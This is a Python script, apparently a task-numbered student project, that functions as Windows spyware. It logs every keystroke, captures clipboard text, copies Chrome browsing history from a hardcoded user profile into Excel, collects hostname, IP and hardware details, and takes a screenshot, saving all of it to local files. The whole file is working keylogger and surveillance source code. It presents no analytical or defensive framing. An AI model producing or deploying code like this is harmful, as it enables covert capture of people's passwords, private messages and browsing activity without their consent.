import os
import sqlite3
import datetime
import socket
import platform
import win32clipboard
import platform
import subprocess
from PIL import ImageGrab
import pandas as pd
from pynput.keyboard import Key, Listener

# Task 1: Record keystrokes and store them in a text file
keystrokes = []

def on_press(key):
    keystrokes.append(key)

    if key == Key.esc:
        write_keystrokes()
        return False  # Stop the listener

def write_keystrokes():
    with open('keystrokes.txt', 'w') as f:
        for key in keystrokes:
            f.write(str(key) + '\n')

# Task 2: Record clipboard in a text file
def record_clipboard():
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
            clipboard_data = win32clipboard.GetClipboardData()
            current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open('clipboard.txt', 'a') as f:
                f.write(f'\n date and time:{current_datetime} \n clipboard data:\n {clipboard_data}\n')
        else:
            print("No text data found in clipboard.")
    except Exception as e:
        print("Error:", e)
    finally:
        win32clipboard.CloseClipboard()
  

# Task 3: Record google search history and store it in an Excel file
def record_search_history():
    # Connect to the Chrome history database
    conn = sqlite3.connect('C:\\Users\\ARYAN\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 3\\History')
    cursor = conn.cursor()

    # Execute query to retrieve search history
    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
    search_history = cursor.fetchall()

    # Keep track of visited URLs to ensure only the latest entry is included
    visited_urls = set()

    # Convert last_visit_time from timestamp to datetime and format it properly
    formatted_history = []
    for url, title, last_visit_time in search_history:
        if url not in visited_urls:
            # Convert microseconds timestamp to seconds
            last_visit_time_seconds = last_visit_time / 1000000.0
            # Convert to datetime object
            visit_datetime = datetime.datetime(1601, 1, 1) + datetime.timedelta(seconds=last_visit_time_seconds)
            # Format datetime as string
            formatted_time = visit_datetime.strftime("%Y-%m-%d %H:%M:%S")
            formatted_history.append((url, title, formatted_time))
            visited_urls.add(url)

    # Convert search history to DataFrame
    df = pd.DataFrame(formatted_history, columns=['URL', 'Title', 'Last Visit Time'])

    # Save DataFrame to Excel file
    df.to_excel('search_history.xlsx', index=False)

    # Close the database connection
    conn.close()

# Task 4: Retrieve user system's information
def get_system_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    os_info = platform.platform()

    # Additional hardware information
    processor = platform.processor()
    system_memory = subprocess.check_output(['wmic', 'memorychip', 'get', 'capacity']).split()[1]
    system_memory_gb = int(system_memory) // (1024 ** 3)  # Convert bytes to GB
    graphics_card = subprocess.check_output(['wmic', 'path', 'win32_videocontroller', 'get', 'name']).split()[1].decode('utf-8')

    with open('system_info.txt', 'w') as f:
        f.write(f'Hostname: {hostname}\n')
        f.write(f'IP Address: {ip_address}\n')
        f.write(f'Operating System: {os_info}\n')
        f.write(f'Processor: {processor}\n')
        f.write(f'System Memory: {system_memory_gb} GB\n')
        f.write(f'Graphics Card: {graphics_card}\n')

# Rest of code remains unchanged

# Task 5: Take a screenshot when you stop the program
def take_screenshot():
    im = ImageGrab.grab()
    im.save('screenshot.png')

# Listener for keystrokes
with Listener(on_press=on_press) as listener:
    # Record clipboard, search history, and system info
    record_clipboard()
    record_search_history()
    get_system_info()

    # Wait for the listener to stop
    listener.join()

    # Take a screenshot when the program stops
    take_screenshot()
